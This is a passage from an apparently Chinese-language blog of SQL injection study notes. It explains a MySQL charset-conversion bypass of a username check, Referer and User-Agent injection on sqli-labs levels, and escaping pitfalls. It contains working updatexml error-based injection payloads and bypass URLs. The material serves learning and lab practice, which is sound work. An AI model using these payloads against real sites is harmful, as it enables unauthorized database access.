&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_connect&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;root&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;root123&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_select_db&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;set names utf-8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;&amp;lt;&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;;&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_real_escape_string&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hehe&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;select * from `demo` where `name`=`&lt;span class=&#34;subst&#34;&gt;&amp;#123;$name&amp;#125;&lt;/span&gt;`&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;quot;hehe&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;$c&amp;#125;&lt;/span&gt; &amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过上述脚本，我么可以查到一些 latin1 的单词，来绕过，比如 &lt;code&gt;Å&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一些通过 get 提交，mysql 不认识，但 php 认识的字符，限制于 get&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt; === &lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;REMOTE_ADDR&amp;#x27;&lt;/span&gt;] !== &lt;span class=&#34;string&#34;&gt;&amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Permission denied!&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$mysqli&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM z_users where username = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;$username&amp;#125;&lt;/span&gt;&amp;#x27; and password = &amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;$password&amp;#125;&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;大概内容就是 username=admin 时会直接 die，不是 admin 但又查不出东西&lt;/p&gt;
&lt;p&gt;mysql 默认字符集为 latin1，根本原因为 mysql 字符集和 mysqli 客户端字符集不同。我们通过语句 &lt;code&gt;mysql_query(&amp;quot;set names utf-8&amp;quot;);&lt;/code&gt;  , &lt;code&gt;set names utf8&lt;/code&gt;  的意思是将客户端的字符集设置为 utf8。mysql 有如下几种 charset&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mysql&amp;gt; show variables like &amp;quot;%character%&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+--------------------------+------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| Variable_name            | Value                                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+--------------------------+------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_set_client     | utf8                                     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_set_connection | utf8                                     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_set_database   | gbk                                      |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_set_filesystem | binary                                   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_set_results    | utf8                                     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_set_server     | utf8                                     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_set_system     | utf8                                     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| character_sets_dir       | D:\BtSoft\mysql\MySQL5.5\share\charsets\ |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+--------------------------+------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8 rows in set (0.04 sec)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在默认情况下，mysql 字符集为 latin1，而执行了 &lt;code&gt;set names utf8;&lt;/code&gt;  以后， &lt;code&gt;character_set_client&lt;/code&gt; 、 &lt;code&gt;character_set_connection&lt;/code&gt; 、 &lt;code&gt;character_set_results&lt;/code&gt;  等与客户端相关的配置字符集都变成了 utf8，但 &lt;code&gt;character_set_database&lt;/code&gt; 、 &lt;code&gt;character_set_server&lt;/code&gt;  等服务端相关的字符集还是 latin1。&lt;/p&gt;
&lt;p&gt;因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql 在执行查询的时候，就涉及到字符集的转换。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;MySQL Server 收到请求时将请求数据从 character_set_client 转换为 character_set_connection；&lt;/li&gt;
&lt;li&gt;进行内部操作前将请求数据从 character_set_connection 转换为内部操作字符集&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;character_set_client&lt;/code&gt;  和 &lt;code&gt;character_set_connection&lt;/code&gt;  被设置成了 utf8，而 &lt;code&gt;内部操作字符集&lt;/code&gt; 其实也就是 &lt;code&gt;username&lt;/code&gt;  字段的字符集还是默认的 latin1。于是，整个操作就有如下字符串转换过程：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;utf8 --&amp;gt; utf8 --&amp;gt; latin1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后执行比较 &lt;code&gt;username=&#39;admin&#39;&lt;/code&gt;  的时候， &lt;code&gt;&#39;admin&#39;&lt;/code&gt;  是一个 latin1 字符串。&lt;/p&gt;
&lt;p&gt;因此对于以下 url：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://localhost:9090/test.php?username=admin%e4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://localhost:9090/test.php?username=admin%e4%bd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://localhost:9090/test.php?username=admin%e4%bd%ac&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前两个可以正常查询，但最后一个会产生错误，并且 url 中从 &lt;code&gt;%e4%bd%ac&lt;/code&gt;  变为了 &lt;code&gt;佬&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在输入 % e4,% e4% bd 时，因为 utf8 是三个字节，他不认识这个两个字节和一个字节的玩意，自动忽略，扔给 latin1 时还是 admin，因此服务端正常查询&lt;/p&gt;
&lt;p&gt;一但 % e4% bd% ac 输入完整后，这三个字节拼成了佬，现在 utf8 认识了，传给服务端的时候变成了 admin 佬，现在 latin1 不认识了，开始报错&lt;/p&gt;
&lt;p&gt;这就是这三个前两个可以正常查询，但第三个报错的原因&lt;/p&gt;
&lt;p&gt;继续查询，我们发现只有部分字符可以正常查询出结果，但有些不能&lt;/p&gt;
&lt;p&gt;比如 admin% c2 可以，但 admin% c1 就不行，经过师傅的测试，有如下结果&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;\x00 &lt;code&gt;~&lt;/code&gt; \x7F`： 返回空白结果&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\x80&lt;/code&gt; ~ &lt;code&gt;\xC1&lt;/code&gt; ： 返回错误 Illegal mix of collations&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\xC2&lt;/code&gt; ~ &lt;code&gt;\xEF&lt;/code&gt; ： 返回 admin 的结果&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\xF0&lt;/code&gt; ~ &lt;code&gt;\xFF&lt;/code&gt; ： 返回错误 Illegal mix of collations&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;UTF-8 编码是变长编码，可能有 1~4 个字节表示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022172222480.png&#34; alt=&#34;image-20221022172222480&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后根据 RFC 3629 规范，又有一些字节值是不允许出现在 UTF-8 编码中的：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db28c7b4-4dc9-4592-9fc7-23f0290c3892.6e734d61aa73.jpg&#34; alt=&#34;14917445720884.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以最终，UTF-8 第一字节的取值范围是：00-7F、C2-F4，这也是我在 admin 后面加上 80-C1、F5-FF 等字符时会抛出错误的原因。&lt;/p&gt;
&lt;p&gt;那么，为什么 &lt;code&gt;username=admin%F0&lt;/code&gt;  也不行呢？F0 是在 C2-F4 的范围中呀？&lt;/p&gt;
&lt;p&gt;这又涉及到 Mysql 中另一个特性：&lt;strong&gt;Mysql 的 utf8 其实是阉割版 utf-8 编码，Mysql 中的 utf8 字符集最长只支持三个字节&lt;/strong&gt;，&lt;/p&gt;
&lt;p&gt;F0-F4 是四字节才有的，所以我传入 &lt;code&gt;username=admin%F0&lt;/code&gt;  也将抛出错误。&lt;/p&gt;
&lt;p&gt;如果你需要 Mysql 支持四字节的 utf-8，可以使用 &lt;code&gt;utf8mb4&lt;/code&gt;  编码。我将原始代码中的 set names 改成 &lt;code&gt;set names utf8mb4&lt;/code&gt; ，就可以正常查询了&lt;/p&gt;
&lt;p&gt;总结：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;对于php和mysql之间的编码问题，post和get方法是不一样的，post不用URL编码，可以直接用latin文字绕过&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get需要利用到mysql字符集之间的转换，同时还要对utf8的字节范围熟悉，这样在utf8-utf9-latin1时就可以利用编码转换逃逸了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;同时注意mysql的utf8是三个字节的，要是想用f0-f4需要把编码变为utf8mb4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;utf8mb4是个好东西，还能防宽字节，下面会有详细描述&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;参考 p 师傅博客：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20=&#34;&gt;https://www.leavesongs.com&lt;/span&gt;&lt;/p&gt;
&lt;h5 id=&#34;referer注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#referer注入&#34;&gt;#&lt;/a&gt; referer 注入&lt;/h5&gt;
&lt;p&gt;通过 referer 字段不严格的过滤产生注入&lt;/p&gt;
&lt;p&gt;phpcmsv9 存在 referer 注入&lt;/p&gt;
&lt;p&gt;sqllab pass-19&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png&#34; alt=&#34;image-20220311175006708&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过闭合确定 referer 存在注入&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png&#34; alt=&#34;image-20220311175111332&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造如下 payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: 1&amp;#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: 1&amp;#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1),&amp;#x27;127.0.0.100&amp;#x27;)#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png&#34; alt=&#34;image-20220311175111332&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意题目源码：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$insert=&amp;quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&amp;#x27;$uagent&amp;#x27;, &amp;#x27;$IP&amp;#x27;)&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;闭合时需要在闭合一个括号&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;user-agent注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#user-agent注入&#34;&gt;#&lt;/a&gt; user-agent 注入&lt;/h5&gt;
&lt;p&gt;参考 sqllab 第 18 关&lt;/p&gt;
&lt;p&gt;1. 关于 sql 参数过滤，check_input 用于检查输入的内容。&lt;/p&gt;
&lt;p&gt;第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符&lt;/p&gt;
&lt;p&gt;如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;value = stripslashes(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span 